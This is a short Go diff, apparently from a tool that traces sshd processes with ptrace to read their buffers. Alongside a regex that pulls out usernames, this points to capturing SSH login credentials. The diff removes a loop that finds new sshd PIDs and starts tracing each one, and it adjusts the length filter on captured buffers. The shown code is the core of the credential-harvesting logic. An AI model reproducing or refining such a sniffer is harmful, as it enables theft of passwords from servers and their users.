@@ -8,34 +8,7 @@ import (
 	"strconv"
 	"strings"
 	"syscall"
-	"time"
 )
-
-func watchSSHDProcesses() {
-	processedPIDs := make(map[int]struct{})
-
-	for {
-		select {
-		case <-shutdownChan:
-			return
-		default:
-			sshdPIDs, err := findSSHDProcesses()
-			if err != nil {
-				time.Sleep(5 * time.Second)
-				continue
-			}
-
-			for _, pid := range sshdPIDs {
-				if _, processed := processedPIDs[pid]; !processed {
-					go traceSSHDProcess(pid)
-					processedPIDs[pid] = struct{}{}
-				}
-			}
-
-			time.Sleep(1 * time.Second)
-		}
-	}
-}
 
 func findSSHDProcesses() ([]int, error) {
 	var sshdPIDs []int
@@ -111,7 +84,7 @@ func traceSSHDProcess(pid int) {
 				if len(matches) == 2 {
 					username = string(matches[1])
 				}
-				if reg.Rdi == 5 && len(buffer) < 250 && len(buffer) > 1 && string(buffer) != "" {
+				if reg.Rdi == 5 && len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
 					excludeString := "\\x00\\x00\\x00.\\f"
 					if !regexp.MustCompile(excludeString).MatchString(string(buffer)) {
 						cleanedBuffer := strings.TrimLeft(string(buffer), "\n")
